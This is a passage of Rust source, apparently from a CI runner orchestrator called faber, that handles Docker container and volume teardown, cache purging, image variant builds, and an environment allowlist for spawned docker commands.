    match (runner, dind) {
        (Err(r), Err(d)) => anyhow::bail!(
            "killing {} failed ({r}) and killing {} failed ({d})",
            names.runner,
            names.dind
        ),
        (Err(e), Ok(())) => {
            anyhow::bail!("killing {} failed ({e}); its dind was killed", names.runner)
        }
        (Ok(()), Err(e)) => {
            warn!(
                "forced stop: killing {} failed ({e}); the runner was killed",
                names.dind
            );
            Ok(())
        }
        (Ok(()), Ok(())) => Ok(()),
    }
}

/// What [`remove_repo_cache_volumes`] did.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum CachePurge {
    /// Every cache volume of the repo is gone; the names removed (none when there
    /// was none to remove).
    Removed(Vec<String>),
    /// The daemon refused: a container still mounts this one. Try again later.
    InUse(String),
    /// The labelled volumes (if any) are gone, but a volume named like this repo's
    /// cache and carrying no provenance label is still there: one from before
    /// faber labelled its volumes. Never deleted by name, and never reported as
    /// clean either — the operator removes it by hand.
    Unlabelled { removed: Vec<String>, name: String },
}

/// Delete a repo's persistent cache volume (ADR-0005) after an enforced trust
/// bypass (ADR-0030).
///
/// The one path in faber that removes a [`KIND_CACHE`] volume. The janitor
/// shields it from every sweep and that shield is unchanged: this is reached only
/// from bypass enforcement, for one named repo. faber created the volume and any
/// job rebuilds it, which is what puts it within what faber may delete; it cannot
/// tell a clean cache from one a hostile job wrote into, so it deletes it.
///
/// Found by label — `org.faber.kind=cache` and the repo — never by name (AGENTS.md).
/// A cache volume from before faber labelled its volumes carries neither, and is
/// left alone. Removed without `-f`, so a volume some container still mounts is
/// refused by the daemon and reported as [`CachePurge::InUse`] rather than pulled
/// out from under it.
pub(crate) async fn remove_repo_cache_volumes(owner_repo: &str) -> anyhow::Result<CachePurge> {
    let names = volume_names(
        docker_lines(&cache_volume_ls_args(owner_repo), CLI_TIMEOUT).await?,
        "gate bypass: cache volume listing",
    );
    // Read-only, and for reporting alone: the one name a pre-label cache volume
    // of this repo would have. Nothing found this way is ever deleted.
    let legacy = cache_volume_name(owner_repo);
    let named = docker_lines(&volume_name_ls_args(&legacy), CLI_TIMEOUT).await?;
    let mut removed = Vec::new();
    for name in &names {
        match docker_rm(&["volume", "rm", name]).await {
            Ok(_) => removed.push(name.clone()),
            Err(e) if volume_in_use(&e.to_string()) => return Ok(CachePurge::InUse(name.clone())),
            Err(e) => return Err(e),
        }
    }
    Ok(purge_outcome(removed, &names, &named, &legacy))
}

/// The outcome once the labelled volumes are removed: clean, unless a volume
/// named exactly `legacy` exists (`named`, a name-filtered listing) that the
/// label listing (`labelled`) did not return.
fn purge_outcome(
    removed: Vec<String>,
    labelled: &[String],
    named: &[String],
    legacy: &str,
) -> CachePurge {
    let unlabelled = named.iter().any(|n| n == legacy) && !labelled.iter().any(|n| n == legacy);
    if unlabelled {
        CachePurge::Unlabelled {
            removed,
            name: legacy.to_string(),
        }
    } else {
        CachePurge::Removed(removed)
    }
}

/// `docker volume ls` filtered by name. Docker's name filter matches substrings,
/// so the caller compares the results exactly.
fn volume_name_ls_args(name: &str) -> Vec<String> {
    vec![
        "volume".into(),
        "ls".into(),
        "--filter".into(),
        format!("name={name}"),
        "--format".into(),
        "{{ .Name }}".into(),
    ]
}

fn cache_volume_ls_args(owner_repo: &str) -> Vec<String> {
    vec![
        "volume".into(),
        "ls".into(),
        "--filter".into(),
        format!("label={LABEL_KIND}={KIND_CACHE}"),
        "--filter".into(),
        format!("label={LABEL_REPO}={owner_repo}"),
        "--format".into(),
        "{{ .Name }}".into(),
    ]
}

/// Whether a failed `volume rm` was refused because a container mounts it.
fn volume_in_use(err: &str) -> bool {
    err.to_lowercase().contains("in use")
}

/// Build one runner-image variant and, on failure, report the build's own tail
/// rather than just its exit code.
///
/// `limit` is the operator's `build_timeout_secs`: a browser set is a gigabyte
/// over whatever link this host has, so this is the one docker call whose budget
/// is measured in minutes. Bounded regardless — an unbounded build would park a
/// claim forever, which is the failure every timeout in this module exists for.
pub(crate) async fn build_variant(spec: &VariantBuild<'_>, limit: Duration) -> anyhow::Result<()> {
    check_variant_build(spec)?;
    // `docker build` runs the buildx plugin: only from plugin directories
    // root's alone (ADR-0026, amended 2026-10-21).
    if let Some(why) = crate::setup::docker_cli::plugin_gate() {
        warn!("runner-image variant build refused: {why}");
        anyhow::bail!("{why}");
    }
    let _building = BuildInFlight::start();
    let args = build_variant_args(spec);
    let mut cmd = docker_command();
    cmd.args(&args);
    // Not `--progress plain`: the legacy builder, which the CLI falls back to
    // without buildx (the pinned CLI on macOS ships none), refuses the flag
    // outright. BuildKit reads this instead, and the legacy builder ignores it.
    cmd.env("BUILDKIT_PROGRESS", "plain");
    let out = untrusted::output_within_fed(
        cmd,
        spec.recipe.to_vec(),
        limit,
        BUILD_OUTPUT_CAP,
        "docker build",
    )
    .await?;
    if out.status.success() {
        return Ok(());
    }
    // BuildKit logs to stderr; the legacy builder logs its steps to stdout and
    // only the final error to stderr. Both, so the failing step is in the error.
    let log = format!(
        "{}\n{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    anyhow::bail!(
        "docker build exited {}: {}",
        out.status,
        tail_lines(&log, BUILD_LOG_TAIL)
    );
}

/// Variant builds started by this process, and those still running. A build's
/// `RUN` steps hold memory in the Docker VM outside any container faber can list
/// by label, so the co-tenant sampler ([`sample_faber_use`]) refuses a sample that
/// overlapped one: it would charge faber's own build to the co-tenants, and the
/// 24-hour peak would hold that for a day (ADR-0021 §3).
static BUILDS_STARTED: AtomicU64 = AtomicU64::new(0);
static BUILDS_RUNNING: AtomicU64 = AtomicU64::new(0);

/// Counts one variant build as running for as long as it is held.
struct BuildInFlight;

impl BuildInFlight {
    fn start() -> Self {
        BUILDS_RUNNING.fetch_add(1, Ordering::SeqCst);
        BUILDS_STARTED.fetch_add(1, Ordering::SeqCst);
        BuildInFlight
    }
}

impl Drop for BuildInFlight {
    fn drop(&mut self) {
        BUILDS_RUNNING.fetch_sub(1, Ordering::SeqCst);
    }
}

/// A mark of the builds so far: how many have started, or `None` while one runs.
/// Two equal marks around a sample mean no build overlapped it.
fn build_mark() -> Option<u64> {
    let started = BUILDS_STARTED.load(Ordering::SeqCst);
    (BUILDS_RUNNING.load(Ordering::SeqCst) == 0).then_some(started)
}

/// The two values of a variant build that came from the daemon, held to the form
/// Docker writes them in before either goes on a build's command line (#105): the
/// base's id, which becomes a label, and the user it runs as, which reaches the
/// recipe as `${BASE_USER}`. An operator's own recipe may expand that in a `RUN`
/// line, which a shell runs.
///
/// And the one that came from a repo: the version, which reaches the recipe as
/// `${PW_VERSION}` after `playwright@` in an `npx` call (#113). It was checked
/// where it was read; this is the last place before argv, so it is checked again.
/// By length only: the value is the repo's choice.
fn check_variant_build(spec: &VariantBuild<'_>) -> anyhow::Result<()> {
    anyhow::ensure!(
        untrusted::release_version(spec.version),
        "the version to bake is not a release version ({} bytes) — not building it",
        spec.version.len()
    );
    anyhow::ensure!(
        untrusted::image_id(spec.base_id),
        "the base's id {:?} is not an image id — not building on it",
        untrusted::for_log(spec.base_id, 80)
    );
    anyhow::ensure!(
        untrusted::user_spec(spec.base_user),
        "the base's user {:?} is not a USER value — not building on it",
        untrusted::for_log(spec.base_user, 80)
    );
    Ok(())
}

/// How much of a build's output faber reads: far above [`untrusted::OUTPUT_CAP`],
/// because a plain build log (BuildKit's plain progress, or the legacy
/// builder's own) carries every step's output, and installing a browser set's
/// system dependencies is a long log. Still a cap.
const BUILD_OUTPUT_CAP: usize = 64 * 1024 * 1024;

/// How many trailing log lines a failed build carries into its error. Enough to
/// hold the step that failed and its output; short enough that the whole thing
/// fits an audit record.
const BUILD_LOG_TAIL: usize = 30;

/// How much of one build-log line the error carries.
const BUILD_LOG_LINE: usize = 400;

/// The last `n` non-empty lines of a build log, for the error message, each with
/// its control characters escaped and cut to [`BUILD_LOG_LINE`]: the log is the
/// build's output, and it lands in the audit trail.
fn tail_lines(text: &str, n: usize) -> String {
    let lines: Vec<&str> = text
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty())
        .collect();
    lines[lines.len().saturating_sub(n)..]
        .iter()
        .map(|l| untrusted::for_log(l, BUILD_LOG_LINE))
        .collect::<Vec<_>>()
        .join(" | ")
}

/// Everything one variant build needs. A struct rather than seven positionals for
/// the reason [`Mounts`] is one: past a certain width the arguments stop
/// documenting themselves and start inviting a transposition.
pub(crate) struct VariantBuild<'a> {
    /// The derivation recipe's bytes — faber's own template, or the operator's,
    /// read once after its ownership was checked (ADR-0028) — fed to `docker
    /// build` on stdin (`--file -`), so the path is never read a second time.
    pub recipe: &'a [u8],
    /// The build context. faber's template needs none, so this is the recipe's
    /// own directory: an operator recipe that does `COPY` still works, and
    /// every entry in it was held to the same ownership rule as the recipe.
    pub context: &'a Path,
    /// The profile's base image, as `FROM ${BASE}`.
    pub base: &'a str,
    /// The base's content id, recorded on the variant so a base rebuild orphans
    /// its variants instead of silently keeping them in service.
    pub base_id: &'a str,
    /// The user the base runs as, restored after the root-only install steps.
    pub base_user: &'a str,
    /// The toolchain version this variant bakes.
    pub version: &'a str,
    /// The tag to produce.
    pub tag: &'a str,
}

/// The argv for one variant build.
///
/// faber stamps the labels itself — including [`crate::drift::DRIFT_LABEL`],
/// which the recipe never sets. What an image *is* should be a fact faber asserts
/// about something faber built, not a line a recipe has to remember; asserting it
/// here is also what guarantees the next drift check reads the variant as in
/// sync rather than re-diagnosing what it just healed.
///
/// `--pull=false` is not a default worth relying on: the base is a local-only
/// image that exists in no registry, so a build that decided to resolve it
/// remotely would fail for a reason that has nothing to do with the build.
fn build_variant_args(spec: &VariantBuild<'_>) -> Vec<String> {
    let mut args: Vec<String> = vec![
        "build".into(),
        "--file".into(),
        "-".into(),
        "--pull=false".into(),
    ];
    for (k, v) in [
        ("BASE", spec.base),
        ("BASE_USER", spec.base_user),
        ("PW_VERSION", spec.version),
    ] {
        args.push("--build-arg".into());
        args.push(format!("{k}={v}"));
    }
    for label in [
        format!("{LABEL_OWNED}=true"),
        format!("{LABEL_KIND}={KIND_IMAGE}"),
        format!("{LABEL_BASE}={}", spec.base_id),
        format!("{}={}", crate::drift::DRIFT_LABEL, spec.version),
    ] {
        args.push("--label".into());
        args.push(label);
    }
    args.push("--tag".into());
    args.push(spec.tag.into());
    args.push(spec.context.to_string_lossy().into_owned());
    args
}

/// Classify an `inspect` result into "is this resource absent?". `None` means the
/// daemon didn't say — the probe timed out or failed for some unrelated reason —
/// and a caller must never read that as "gone".
fn inspect_absence(success: bool, stderr: &str) -> Option<bool> {
    if success {
        return Some(false);
    }
    let msg = stderr.to_lowercase();
    (msg.contains("no such") || msg.contains("not found")).then_some(true)
}

/// Ask the daemon whether `name` is gone. See [`inspect_absence`] for the
/// three-way answer.
async fn container_absent(name: &str) -> Option<bool> {
    let out = docker_output(
        &["container", "inspect", "-f", "{{.Id}}", name],
        CLI_TIMEOUT,
    )
    .await
    .ok()?;
    inspect_absence(out.status.success(), &String::from_utf8_lossy(&out.stderr))
}

/// Poll `probe` until it confirms absence or `budget` runs out. Generic over the
/// probe so "re-check rather than assume failure" is unit-testable without a
/// daemon in the loop.
async fn wait_absent<F, Fut>(mut probe: F, budget: Duration, poll: Duration) -> bool
where
    F: FnMut() -> Fut,
    Fut: std::future::Future<Output = Option<bool>>,
{
    let deadline = tokio::time::Instant::now() + budget;
    loop {
        if probe().await == Some(true) {
            return true;
        }
        if tokio::time::Instant::now() >= deadline {
            return false;
        }
        tokio::time::sleep(poll).await;
    }
}

/// Force-remove a container, *confirming* the outcome rather than trusting the
/// client's patience. `Ok(())` means it is gone — either the removal returned, or
/// it overran [`TEARDOWN_TIMEOUT`] and a re-probe found the container gone anyway
/// (the daemon finishing what the client stopped waiting for). Only a container
/// still present after [`REMOVE_CONFIRM`] is a genuine failure.
///
/// This distinction is what keeps the dind volume from being abandoned: the
/// volume removal that follows is only attempted once the container that mounts
/// it is known to be gone, instead of firing blind into a `volume is in use`.
async fn remove_container(name: &str) -> anyhow::Result<()> {
    let err = match docker_rm(&["rm", "-f", "-v", name]).await {
        Ok(_) => return Ok(()),
        Err(e) => e,
    };
    if wait_absent(|| container_absent(name), REMOVE_CONFIRM, REMOVE_POLL).await {
        info!("teardown: {name} removal reported `{err}` but the container is gone");
        return Ok(());
    }
    Err(err)
}

/// Whether a failed `volume rm` is worth re-attempting. The daemon refuses a
/// volume some container still mounts; right after a slow `rm -f` that container
/// may simply be mid-removal, so `in use` is a race to wait out. Every other
/// error is final.
fn retry_volume_rm(err: &str, attempt: u32) -> bool {
    attempt < VOLUME_RM_ATTEMPTS && err.to_lowercase().contains("in use")
}

/// Remove the dind volume, re-attempting while the daemon reports it in use.
/// This is the multi-GB artifact of the job — every one left behind grows
/// `Docker.raw` permanently (see [`TEARDOWN_TIMEOUT`]).
async fn remove_volume(vol: &str) {
    for attempt in 1..=VOLUME_RM_ATTEMPTS {
        match docker_rm(&["volume", "rm", vol]).await {
            Ok(_) => return,
            Err(e) if retry_volume_rm(&e.to_string(), attempt) => {
                debug!("teardown: volume {vol} still in use (attempt {attempt}); retrying");
                tokio::time::sleep(VOLUME_RM_BACKOFF).await;
            }
            Err(e) => {
                warn!("teardown: removing volume {vol}: {e}");
                return;
            }
        }
    }
}

/// Best-effort teardown: force-remove the runner + dind, delete the network,
/// then the dind volume. Errors are logged, not propagated — a leaked resource
/// must not mask the job's own result, and a partial failure here shouldn't
/// abort the reconcile loop.
///
/// ORDERING IS LOAD-BEARING: a volume can only go once no container mounts it, so
/// the dind removal must be *confirmed* before the volume is attempted. Firing
/// all four removals blind — the previous shape — abandoned the volume on every
/// teardown whose `rm -f` merely overran its cap.
///
/// `dind` says whether this run had a daemon at all. Reaping what was never
/// created is not harmless: `docker rm` on an absent container fails, and the
/// confirm-it-is-gone fallback then *succeeds* while logging a removal that never
/// happened, and `volume rm` on an absent volume warns outright. Teardown must
/// reap exactly what the ramp built.
///
/// `services` are the names of the job's declared services (ADR-0046), empty for
/// a job that had none. They are detached after the runner is gone and before
/// the network goes: the shared server's interface on it, and any per-job
/// service container, would otherwise hold its last endpoint and fail `network
/// rm`.
///
/// Returns why the pull-through mirror failed this job, if it did (ADR-0047 §7),
/// which [`note_mirror_incident`] puts on a failed outcome.
async fn teardown(
    names: &Names,
    dind: bool,
    services: &[String],
    owner_repo: &str,
) -> Option<String> {
    // The runner runs without `--rm` (it must survive its exit for the OOM
    // inspect), so force-remove it here on every path. `-v` reaps any anonymous
    // volumes with the container — without it they survive the removal forever.
    let mut dind_gone = true;
    for (name, is_dind) in [(&names.runner, false), (&names.dind, true)] {
        if is_dind && !dind {
            continue;
        }
        if let Err(e) = remove_container(name).await {
            warn!("teardown: removing container {name}: {e}");
            // Only the dind mounts the volume; a stuck runner doesn't block it.
            dind_gone &= !is_dind;
        }
    }
    if !services.is_empty() {
        crate::services::global()
            .detach(
                services,
                &crate::services::JobNet {
                    id: &names.id,
                    owner_repo,
                    net: &names.net,
                },
            )
            .await;
    }
    // The mirror holds an endpoint on the network while connected, and `network
    // rm` would refuse. A no-op with `[mirror]` absent. It also revokes the job's
    // mirror token.
    let mirror_incident = crate::mirror::global().release_network(&names.net).await;
    if let Err(e) = docker_rm(&["network", "rm", &names.net]).await {
        warn!("teardown: removing network {}: {e}", names.net);
    }
    // The job-started hook's volume (ADR-0059 §1), once the runner that mounted
    // it is gone. Absent when the run never got as far as filling it, which
    // `volume rm` answers as already done.
    remove_volume(&names.hook).await;
    // Only `names.vol` — dind's per-job `/var/lib/docker`. The `faber-cache-<repo>`
    // volume ([`cache_volume_name`]) is deliberately absent from here and from
    // [`Names`] entirely: persisting across jobs is its whole purpose, so it is not
    // a per-job resource and teardown must never see it as one.
    if !dind {
        return mirror_incident;
    }
    if dind_gone {
        remove_volume(&names.vol).await;
    } else {
        // Attempting it would only earn a guaranteed `in use`; the janitor reaps
        // the volume once it reaps the dind still holding it.
        warn!(
            "teardown: dind {} outlived its removal; leaving volume {} to the janitor",
            names.dind, names.vol
        );
    }
    mirror_incident
}

/// ADR-0047 §7: a job that failed while the mirror failed one of its requests
/// (or was down, or restarted, under it) gets `cause: mirror` on its outcome
/// record. Only a plain failure: a success, a reclaim, a timeout or an infra
/// error already says what happened, and the mirror is not why.
fn note_mirror_incident(report: &mut RunReport, runner: &str, incident: Option<String>) {
    let Some(why) = incident else {
        return;
    };
    if report.job_ok || report.reclaimed || report.timed_out || report.infra_error {
        return;
    }
    warn!("docker runner {runner}: failed after the mirror failed it ({why})");
    report.cause = Some(crate::mirror::CAUSE.to_string());
}

/// Every variable [`docker_command`] will copy from faber's own environment,
/// when set — AGENTS.md/ADR-0025 §8. Anything else stays invisible to a spawned
/// `docker`: not `SSH_AUTH_SOCK`, not `GH_TOKEN`, not whatever else faber's own
/// process happens to be carrying. `TMPDIR` and `LANG` are here for the build
/// and `stats` paths, which may legitimately need them; the JIT secret is never
/// on this list — it is set explicitly, per call, by whichever one child
/// actually needs it (see [`RUNNER_JITCONFIG_ENV`]).
const DOCKER_ENV_ALLOWLIST: &[&str] = &[
    "PATH",
    "HOME",
    "DOCKER_HOST",
    "DOCKER_CONTEXT",
    "DOCKER_CONFIG",
    "DOCKER_CERT_PATH",
    "DOCKER_TLS_VERIFY",
    "DOCKER_API_VERSION",
    "DOCKER_BUILDKIT",
    "BUILDKIT_PROGRESS",
    "TMPDIR",
    "LANG",
];

/// Whether `name` is a variable the `docker` CLI child reads for itself: one of
/// [`DOCKER_ENV_ALLOWLIST`], or anything under `DOCKER_` or `BUILDKIT_`. Set by
/// anything but faber it would steer faber's own call (the daemon, the
/// credentials, the binary found), so no extra child environment may carry one
/// ([`docker_output_run`]) and config refuses them in a service's `env` and
/// `job_env` (ADR-0046 A2).
pub(crate) fn docker_cli_env_name(name: &str) -> bool {
    DOCKER_ENV_ALLOWLIST.contains(&name)
        || name.starts_with("DOCKER_")
        || name.starts_with("BUILDKIT_")
}

/// `env_clear()`, then copy only [`DOCKER_ENV_ALLOWLIST`] from `lookup`.
///
/// `endpoint` is faber's own Docker socket where it has one ([`docker_endpoint`]).
/// Then `DOCKER_HOST` names it and nothing in `lookup` may choose the daemon:
/// `DOCKER_HOST` and `DOCKER_CONTEXT` are not copied, so neither faber's own
/// environment nor a client config's current context can point a `docker` call
/// at Docker Desktop (ADR-0026, "Docker Desktop stops being faber's").
///
/// Split from [`docker_command`] purely so the allowlist itself can be
/// exercised without `std::env::set_var` — unsound in a multi-threaded test
/// binary (issue #47): the production entrypoint passes `std::env::var` in, a
/// test passes a fake map instead. Same shape `crate::platform` already uses
/// for its own environment seam.
fn apply_docker_env(
    cmd: &mut Command,
    lookup: impl Fn(&str) -> Option<String>,
    endpoint: Option<&std::path::Path>,
) {
    cmd.env_clear();
    for key in DOCKER_ENV_ALLOWLIST {
        if endpoint.is_some() && matches!(*key, "DOCKER_HOST" | "DOCKER_CONTEXT") {
            continue;
        }
        if let Some(val) = lookup(key) {
            cmd.env(key, val);
        }
    }
    if let Some(sock) = endpoint {
        cmd.env("DOCKER_HOST", format!("unix://{}", sock.display()));
    }
}

/// The Docker socket faber's `docker` calls must use, when it is faber's own: the
/// Linux VM's bridge ([`crate::platform::vm_docker_socket`]) on a set-up macOS
/// host. `None` elsewhere, where `DOCKER_HOST` passes through as before.
fn docker_endpoint() -> Option<std::path::PathBuf> {
    #[cfg(target_os = "macos")]
    if crate::platform::layout() == crate::platform::Layout::System {
        return Some(crate::platform::vm_docker_socket());
    }
    None
}

/// The one constructor every `docker` spawn in this crate goes through
/// (AGENTS.md/ADR-0025 §8: an environment allowlist is a speed bump, not a
/// boundary, but it removes the cheapest route a secret has into a job). Every
/// other `Command::new("docker")` in this file was replaced by a call to this.
///
/// The program is [`crate::platform::docker_cli`]: on a SYSTEM macOS host the
/// pinned, root-owned CLI setup installs, by absolute path, since the daemon's
/// `PATH` holds nothing an operator can write (ADR-0026, amended 2026-10-21);
/// `docker` from `PATH` everywhere else.
pub(crate) fn docker_command() -> Command {
    let mut cmd = Command::new(crate::platform::docker_cli());
    apply_docker_env(
        &mut cmd,
        |k| std::env::var(k).ok(),
        docker_endpoint().as_deref(),
    );
    cmd
}

/// Poll `docker exec <dind> docker info` until the daemon answers or we time out.
async fn wait_for_dind(dind: &str) -> anyhow::Result<()> {
    let deadline = tokio::time::Instant::now() + DIND_READY_TIMEOUT;
    loop {
        // Bound each attempt: an unresponsive daemon would otherwise block the
        // first probe forever and `deadline` below would never be consulted.
        let probe = docker_command()
            .args(["exec", dind, "docker", "info"])
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .kill_on_drop(true)
            .status();
        let ready = matches!(
            tokio::time::timeout(DIND_EXEC_TIMEOUT, probe).await,
            Ok(Ok(status)) if status.success()
        );
        if ready {
            return Ok(());
        }
        if tokio::time::Instant::now() >= deadline {
            anyhow::bail!("dind {dind} did not become ready within {DIND_READY_TIMEOUT:?}");
        }
        tokio::time::sleep(DIND_POLL).await;
    }
}

/// Spawn `docker <args>`, collect its output, and give up after `limit`.
///
/// Every short-lived docker call in this module funnels through here so no single
/// one of them can wait on the daemon indefinitely (see [`CLI_TIMEOUT`]), and none
/// can read more of what the daemon says than [`untrusted::OUTPUT_CAP`] (#105).
/// The bounding itself lives in [`untrusted::output_within`], where it is testable
/// without a Docker daemon in the loop.
async fn docker_output<S: AsRef<std::ffi::OsStr>>(
    args: &[S],
    limit: Duration,
) -> anyhow::Result<std::process::Output> {
    docker_output_capped(args, limit, untrusted::OUTPUT_CAP).await
}

/// [`docker_output`] with a cap of the caller's own, for the calls whose output is
/// legitimately larger than a listing's: a build log, a cache volume's scan.
async fn docker_output_capped<S: AsRef<std::ffi::OsStr>>(
    args: &[S],
    limit: Duration,
    cap: usize,
) -> anyhow::Result<std::process::Output> {
    docker_output_run(args, limit, cap, &[]).await
}

/// [`docker_output`], with `extra_env` set on top of [`DOCKER_ENV_ALLOWLIST`] for
/// this one child only. The sole caller today is the runner launch, which needs
/// the JIT config in this child's environment and nowhere else — see
/// [`RUNNER_JITCONFIG_ENV`].
async fn docker_output_with_env<S: AsRef<std::ffi::OsStr>>(
    args: &[S],
    limit: Duration,
    extra_env: &[(&str, &str)],
) -> anyhow::Result<std::process::Output> {
    docker_output_run(args, limit, untrusted::OUTPUT_CAP, extra_env).await
}

async fn docker_output_run<S: AsRef<std::ffi::OsStr>>(
    args: &[S],
    limit: Duration,
    cap: usize,
    extra_env: &[(&str, &str)],
) -> anyhow::Result<std::process::Output> {
    if let Some((k, _)) = extra_env.iter().find(|(k, _)| docker_cli_env_name(k)) {
        anyhow::bail!("docker: refusing to set {k} on the CLI child: the CLI reads it itself");
    }
    let mut cmd = docker_command();
    cmd.args(args);
    for (k, v) in extra_env {
        cmd.env(k, v);
    }
    // Name the subcommand ("stats --no-stream") so a timeout log says which call
    // stalled, not merely that one did.
    let what = args
        .iter()
        .take(2)
        .map(|a| a.as_ref().to_string_lossy().into_owned())
        .collect::<Vec<_>>()
        .join(" ");
    untrusted::output_within(cmd, limit, cap, &format!("docker {what}")).await
}

/// A failed call's stderr as it goes into an error message: control characters
/// escaped, and cut to [`STDERR_IN_ERROR`] characters. It is the daemon's text, and
/// the message may end up in a log line or an audit record's `cause` (#105). What
/// callers match on in it ("No such container", "in use") is at its start.
fn stderr_of(out: &std::process::Output) -> String {
    untrusted::for_log(String::from_utf8_lossy(&out.stderr).trim(), STDERR_IN_ERROR)
}

/// How much of a failed call's stderr an error message carries.
const STDERR_IN_ERROR: usize = 2000;

/// The most output [`docker_fed`] keeps from one call.
const FED_OUTPUT_CAP: usize = 64 * 1024;

/// Run a `docker` subcommand with `input` on its stdin
/// ([`untrusted::output_within_fed`]): never on an argv, which `ps` shows. For a
/// script fed to a service's client over `docker exec -i` (ADR-0046 §6), whose
/// caller reads the exit status and nothing it printed.
pub(crate) async fn docker_fed(
    args: &[String],
    input: Vec<u8>,
    limit: Duration,
) -> anyhow::Result<std::process::Output> {
    let mut cmd = docker_command();
    cmd.args(args);
    untrusted::output_within_fed(cmd, input, limit, FED_OUTPUT_CAP, "docker (fed)").await
}

/// Run a `docker` subcommand, returning an error with captured stderr on failure.
/// `limit` is explicit at every call site: a metadata call and a removal that has
/// to delete gigabytes of layers do not belong on the same budget.
pub(crate) async fn docker_ok<S: AsRef<std::ffi::OsStr>>(
    args: &[S],
    limit: Duration,
) -> anyhow::Result<()> {
    docker_ok_with_env(args, limit, &[]).await
}

/// [`docker_ok`], with `extra_env` set on this one child only — see
/// [`docker_output_with_env`].
pub(crate) async fn docker_ok_with_env<S: AsRef<std::ffi::OsStr>>(
    args: &[S],
    limit: Duration,
    extra_env: &[(&str, &str)],
) -> anyhow::Result<()> {
    let out = docker_output_with_env(args, limit, extra_env).await?;
    if !out.status.success() {
        anyhow::bail!("docker exited {}: {}", out.status, stderr_of(&out));
    }
    Ok(())
}

/// Run a docker *removal*, where "already gone" is success, not an error:
/// `Ok(true)` = removed, `Ok(false)` = didn't exist. Shared with [`crate::sweep`],
/// so both the in-process teardown and the janitor get [`TEARDOWN_TIMEOUT`] —
/// the janitor is the backstop for exactly the removals that run long, and had
/// been giving up on them at the metadata budget too.
pub(crate) async fn docker_rm<S: AsRef<std::ffi::OsStr>>(args: &[S]) -> anyhow::Result<bool> {
    match docker_ok(args, TEARDOWN_TIMEOUT).await {
        Ok(()) => Ok(true),
        Err(e) => {
            // Containers say "No such container", networks "not found",
            // volumes "no such volume" — normalize across the wordings.
            let msg = e.to_string().to_lowercase();
            if msg.contains("no such") || msg.contains("not found") {
                Ok(false)
            } else {
                Err(e)
            }
        }
    }
}

/// Run a `docker` subcommand and return its stdout as trimmed, non-empty lines.
/// Shared with [`crate::sweep`] for `ls`-style listings and for `volume prune`,
/// which is a bulk *deletion* wearing a listing's clothes — hence the explicit
/// `limit` rather than an assumed [`CLI_TIMEOUT`].
pub(crate) async fn docker_lines<S: AsRef<std::ffi::OsStr>>(
    args: &[S],
    limit: Duration,
) -> anyhow::Result<Vec<String>> {
    let out = docker_output(args, limit).await?;
    if !out.status.success() {
        anyhow::bail!("docker exited {}: {}", out.status, stderr_of(&out));
    }
    Ok(String::from_utf8_lossy(&out.stdout)
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty())
        .map(String::from)
        .collect())
}

/// Run a `docker` subcommand and return its stdout exactly as printed, for a
/// caller whose output carries names [`docker_lines`] would mangle: its trimming
/// takes a trailing space off a file name, and `str::lines` a trailing `\r`.
/// Used by [`crate::cache`], whose listing is file names inside a volume, and by
/// every JSON listing here, which [`untrusted::json_lines`] splits itself.
/// Bounded by `limit` and `cap` like every other call here, and fails with the
/// captured stderr on a non-zero exit.
pub(crate) async fn docker_stdout<S: AsRef<std::ffi::OsStr>>(
    args: &[S],
    limit: Duration,
    cap: usize,
) -> anyhow::Result<String> {
    let out = docker_output_capped(args, limit, cap).await?;
    if !out.status.success() {
        anyhow::bail!("docker exited {}: {}", out.status, stderr_of(&out));
    }
    Ok(String::from_utf8_lossy(&out.stdout).into_owned())
}

// --- credential volumes ----------------------------------------------------

/// The script a credential fill runs as `sh -c`, with the mount directory, the
/// file name and the owner (or an empty string) as `$1`..`$3`. A constant, so
/// nothing a caller passes is ever shell text. `umask 077` before the file exists
/// makes it `0600` from creation, never `chmod`ed down afterwards, and the
/// directory is closed to `0700`; the owner then gets both, so the one user the
/// consuming container runs as can read them.
const CREDENTIAL_FILL_SCRIPT: &str = r#"set -e
umask 077
cat > "$1/$2"
chmod 0700 "$1"
if [ -n "$3" ]; then chown -R "$3" "$1"; fi
"#;

/// How much of a credential fill's output faber reads: the script prints nothing.
const CREDENTIAL_FILL_CAP: usize = 64 * 1024;

/// One credential to put in a fresh named volume: where it goes, who may read
/// it, and the image whose container writes it. The secret itself is not here —
/// it is the one thing [`CredentialVolume::fill`] takes separately, as bytes for
/// the child's stdin, so nothing built from this struct can carry it.
pub(crate) struct CredentialFill<'a> {
    /// The volume to create and fill.
    pub volume: &'a str,
    /// faber's labels for both the volume and the fill container, so each says
    /// whose it is and the janitor finds a leftover by kind (AGENTS.md: read
    /// labels, never names).
    pub labels: &'a [String],
    /// The fill container's name, so a fill that overran its cap can be removed.
    pub container: &'a str,
    /// An image already on this host — the one the caller is about to run, so a
    /// fill never pulls (`--pull=never`).
    pub image: &'a str,
    /// The directory the volume is mounted at, here and in the consuming
    /// container alike.
    pub dir: &'a str,
    /// The file the secret lands in, inside `dir`.
    pub file: &'a str,
    /// The `USER` to hand the file to, or `None` to leave it root's.
    pub owner: Option<&'a str>,
}

/// The `docker run` for a credential fill: `-i` so stdin reaches `cat`, no
/// network, never a pull, as root (a fresh volume is root's, and only root can
/// hand the file on), the volume read-write. The secret is not an argument here
/// and cannot be: [`CredentialFill`] does not hold it.
///
/// No `--rm`: with it the CLI returns only once Docker has *removed* the
/// container, so a fill that wrote its file in a second failed at the cap while
/// a loaded disk deleted it (#348). The fill is judged by its exit, and
/// [`CredentialVolume::fill`] removes the container after.
fn credential_fill_args(f: &CredentialFill<'_>) -> Vec<String> {
    fill_args(f, CREDENTIAL_FILL_SCRIPT)
}

/// [`credential_fill_args`] with the script the fill container runs: the
/// credential's, or the hook's ([`HOOK_FILL_SCRIPT`]).
fn fill_args(f: &CredentialFill<'_>, script: &str) -> Vec<String> {
    let mut args: Vec<String> = vec![
        "run".into(),
        "-i".into(),
        "--name".into(),
        f.container.into(),
        "--network".into(),
        "none".into(),
        "--pull=never".into(),
        "--user".into(),
        "0:0".into(),
        "--entrypoint".into(),
        "sh".into(),
    ];
    args.extend_from_slice(f.labels);
    args.push("-v".into());
    args.push(format!("{}:{}", f.volume, f.dir));
    args.push(f.image.into());
    args.extend([
        "-c".to_string(),
        script.to_string(),
        "sh".to_string(),
